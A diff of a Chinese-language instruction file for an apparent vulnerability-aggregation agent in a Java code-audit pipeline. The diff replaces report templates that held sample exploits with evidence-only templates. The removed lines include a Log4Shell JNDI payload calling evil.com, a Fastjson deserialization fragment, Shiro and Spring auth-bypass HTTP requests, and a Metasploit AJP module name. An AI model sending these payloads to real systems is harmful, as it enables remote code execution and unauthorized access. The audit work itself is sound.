@@ -1,131 +1,100 @@
-# Agent-4b-vuln-aggregator: 漏洞汇总员 - 执行指令
+# Agent-4b：证据聚合
 
-## 角色信息
+## 职责
 
-```
-角色: agent-4b-vuln-aggregator (漏洞汇总员)
-等待: 阶段1 路由子流程（agent-1-recon → agent-1-N → agent-1-merge）、agent-2-auth-audit、agent-3-vuln-scanner 全部完成
-输出目录: {output_path}/cross_analysis/（已创建，直接写入）
-输出文件:
-  - {output_path}/cross_analysis/component_vulnerabilities.md
-  - {output_path}/cross_analysis/auth_bypass_vulnerabilities.md
-```
+`agent-4b` 聚合两类上游证据：
 
-## 第一部分：生成组件漏洞汇总
+- 组件版本证据：来自 `java-vuln-scanner`，只说明组件、版本、命中规则、触发面待核查和限制。
+- 鉴权绕过发现：来自 `java-auth-audit`，可保留其验证材料索引。
 
-### 执行步骤
+它不生成新的漏洞结论，不补写验证包、评分、具体版本建议、修补历史、版本范围或利用链。
 
-1. 读取 agent-3-vuln-scanner 的漏洞报告
-2. 读取 agent-1-merge 合并的路由列表（主索引 + 各 agent-1-N 的模块详情）
-3. 关联组件漏洞与路由触发点
-4. 生成 `component_vulnerabilities.md`
+## 输入
 
-### 输出模板
+- `{output_path}/vuln_report/`：`java-vuln-scanner` 输出。
+- `{output_path}/auth_audit/`：`java-auth-audit` 输出。
+- `{output_path}/route_mapper/README.md`：用于关联路由范围。
+
+## 输出文件
+
+- `{output_path}/cross_analysis/component_version_evidence.md`
+- `{output_path}/cross_analysis/auth_bypass_findings.md`
+
+## component_version_evidence.md 模板
 
 ```markdown
-# 组件漏洞汇总报告
+# 组件版本证据汇总
 
-## 概览
+## 1. 输入来源
+
+| 来源 | 文件 | 状态 |
+|---|---|---|
+| 组件扫描报告 | {path} | {已读取/缺失} |
+| 路由索引 | {path} | {已读取/缺失} |
+
+## 2. 统计
 
 | 指标 | 数量 |
-|:-----|:-----|
-| 高危组件漏洞 | X |
-| 中危组件漏洞 | Y |
-| 有路由触发点的漏洞 | Z |
+|---|---:|
+| 依赖实例数 | {number} |
+| 命中组件版本数 | {number} |
+| 触发面待核查项 | {number} |
+| 环境条件待确认项 | {number} |
+| 不可确认项 | {number} |
 
-## 高危组件漏洞详情
+## 3. 组件版本命中
 
-### CVE-2021-44228 (Log4j RCE)
+| 组件 | 版本 | 来源模块/文件 | 上游状态 | 证据位置 | 后续处理 |
+|---|---|---|---|---|---|
+| {component} | {version} | {module/path} | {版本命中/触发面待核查/环境条件待确认} | {vuln_report path/section} | {交给专项 skill/仅记录} |
 
-- **组件**：log4j-core 2.14.1
-- **CVSS**：10.0 (Critical)
-- **影响路由**：
-  - /api/upload (❌无鉴权)
-  - /api/process (❌无鉴权)
-  - /admin/log (⚠️仅认证)
-- **利用条件**：可控日志输入
-- **PoC**：`${jndi:ldap://evil.com/a}`
+## 4. 触发面待核查映射
 
-### CVE-xxxx-xxxx (Fastjson 反序列化)
+| 组件 | 可能相关入口 | 关联依据 | 建议下游 |
+|---|---|---|---|
+| {component} | {route 或 未定位} | {配置/类名/依赖用途证据} | {java-route-tracer 或专项 skill} |
 
-- **组件**：fastjson 1.2.24
-- **CVSS**：9.8 (Critical)
-- **影响路由**：
-  - /api/parse (❌无鉴权)
-- **利用条件**：JSON 输入可控
-- **PoC**：`{"@type":"com.sun.rowset.JdbcRowSetImpl",...}`
+## 5. 限制说明
 
-## 中危组件漏洞详情
-
-...
+- 组件版本证据仅表示版本命中，不构成漏洞确认。
+- 未验证网络暴露、运行配置、入口可达性和业务参数可控性。
+- 未生成漏洞验证材料、评分或具体版本建议。
 ```
 
-## 第二部分：生成鉴权绕过漏洞汇总
-
-### 执行步骤
-
-1. 读取 agent-2-auth-audit 的鉴权绕过漏洞
-2. 读取 agent-3-vuln-scanner 中可导致鉴权绕过的组件漏洞
-3. 合并生成 `auth_bypass_vulnerabilities.md`
-
-### 输出模板
+## auth_bypass_findings.md 模板
 
 ```markdown
-# 鉴权绕过漏洞汇总报告
+# 鉴权绕过发现汇总
 
-## 概览
+## 1. 输入来源
 
-| 类型 | 数量 |
-|:-----|:-----|
-| 代码层鉴权绕过 | X |
-| 组件漏洞导致鉴权绕过 | Y |
-| 总计 | X+Y |
+| 来源 | 文件 | 状态 |
+|---|---|---|
+| 鉴权审计报告 | {path} | {已读取/缺失} |
+| 路由索引 | {path} | {已读取/缺失} |
 
-## 一、代码层鉴权绕过（来自 agent-2）
+## 2. 发现列表
 
-### 1. Shiro 权限绕过
+| 发现编号 | 上游状态 | 影响路由 | 验证材料位置 | 证据文件 |
+|---|---|---|---|---|
+| {finding_id} | {已确认/条件成立/不可确认} | {routes} | {auth_audit 报告章节} | {path:line 或章节} |
 
-- **漏洞编号**：H-AUTH-001
-- **影响路由**：/admin/*
-- **绕过方法**：路径穿越 `/admin/;/user`
-- **来源文件**：ShiroConfig.java:45
-- **PoC**：
+## 3. 下游透传
 
-      GET /admin/;/user/list HTTP/1.1
-      Host: target.com
+| 路由 | 方法 | 鉴权标签 | 透传给 route-tracer 的说明 |
+|---|---|---|---|
+| {route} | {method} | {P0/P1/P2} | {只引用上游发现编号和报告路径} |
 
-### 2. Spring Security 配置缺陷
+## 4. 限制说明
 
-- **漏洞编号**：M-AUTH-002
-- **影响路由**：/api/internal/*
-- **绕过方法**：大小写绕过 `/API/internal/`
-- **来源文件**：SecurityConfig.java:78
-- **PoC**：
-
-      GET /API/internal/config HTTP/1.1
-      Host: target.com
-
-## 二、组件漏洞导致鉴权绕过（来自 agent-3）
-
-### 1. CVE-2020-1938 (Tomcat AJP 协议注入)
-
-- **组件**：tomcat-embed-core 8.5.50
-- **CVSS**：9.8 (Critical)
-- **绕过方式**：AJP 协议注入绕过鉴权
-- **影响范围**：所有需要鉴权的路由
-- **利用条件**：AJP 端口 8009 暴露
-- **PoC**：使用 Metasploit 模块 `exploit/multi/http/tomcat_ajp_file_read`
-
-### 2. CVE-2016-4437 (Shiro RememberMe 反序列化)
-
-- **组件**：shiro-core 1.2.4
-- **CVSS**：9.8 (Critical)
-- **绕过方式**：RememberMe Cookie 反序列化绕过鉴权
-- **影响范围**：所有需要鉴权的路由
-- **利用条件**：已知 AES 密钥
-- **PoC**：
-
-      GET /admin/dashboard HTTP/1.1
-      Host: target.com
-      Cookie: rememberMe=[恶意序列化数据]
+- 本文件不新增鉴权绕过结论。
+- 若上游未提供验证材料，只记录为不可确认并要求回到 `java-auth-audit`。
 ```
+
+## 强制要求
+
+- 组件版本证据文件中不得出现验证材料、评分、具体版本建议、修补历史、版本范围或确认性漏洞结论。
+- 组件版本证据文件不得出现“已确认漏洞”“漏洞已确认”“攻击成功”“验证成功”等确认性措辞；只能写“版本命中”“触发面待核查”“环境条件待确认”“不可确认”。
+- 鉴权绕过文件可以引用 `java-auth-audit` 的验证材料位置，但不得重写或扩展验证包。
+- 任何无法从上游文件定位的内容都写“未提供”或“未定位”，不要补全。
+- 所有数量必须来自实际表格或文件计数；不得写尾随加号、范围数量、波浪线数量或估算时长。无法精确统计时写“未精确统计”。
